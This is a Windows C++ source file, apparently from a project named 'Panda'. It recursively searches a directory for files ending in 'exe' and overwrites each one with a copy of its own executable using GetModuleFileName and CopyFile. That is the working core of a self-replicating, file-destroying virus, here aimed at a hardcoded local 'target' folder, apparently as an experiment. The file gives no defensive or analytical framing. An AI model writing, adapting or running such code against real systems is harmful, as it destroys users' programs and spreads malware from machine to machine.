#include "stdio.h"
#include "string.h"
#include "windows.h"
#include <iostream>
#include <vector>

using namespace std;


class ProcessFile
{
private:
    vector<string>  result;
public:
    vector<string>  getResult()
    {
        auto   t = result;
        result.clear();
        return t;
    }

    void findall(char* path)
    {
        WIN32_FIND_DATA findData;
        char buffer[MAX_PATH] = { 0, };
        sprintf(buffer, "%s\\*.*", path);
        HANDLE aim = FindFirstFile(buffer, &findData);
        char* kind = "exe";
        string t;
        if (aim != INVALID_HANDLE_VALUE) {
            while (FindNextFile(aim, &findData))
            {
                if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
                {
                    continue;
                }

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    ZeroMemory(buffer, MAX_PATH);
                    sprintf(buffer, "%s\\%s", path, findData.cFileName);
                    //cout << buffer << endl;
                    //cout << findData.cFileName << endl;
                    //HANDLE next = FindFirstFile(buffer, &findData);
                    //cout << next << endl;
                    findall(buffer);
                }

                else
                {
                    int l = strlen(buffer);
                    buffer[l - 1] = '\0';
                    printf("%s%s\n", buffer, findData.cFileName);
                    buffer[l - 1] = '*';
                    buffer[l] = '\0';

                    t.assign(path);
                    t += '\\';
                    t.append(findData.cFileName);
                    int len = strlen(kind);
                    if (t.substr(t.size() - len) == kind)
                    {
                        result.push_back(t);
                    }

                }
            }
        }
        FindClose(aim);
        if (aim == INVALID_HANDLE_VALUE)
        {
          cout<< "ERROR!" << endl;
          system("pause");
          exit(-1);
        }
    }
};

int main()
{
    ProcessFile p;
    WIN32_FIND_DATA findData;
    char* load = "C:\\Users\\12149\\Source\\Repos\\Panda\\Debug\\target";
    char self[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, self, MAX_PATH);
    //cout << self << endl;

    p.findall(load);
    auto result = p.getResult();

    for (int i = 0; i < result.size(); i++)
    {
     //cout << result[i].c_str() << endl;

     CopyFile(self, result[i].c_str(), FALSE);

    }

    return 0;

}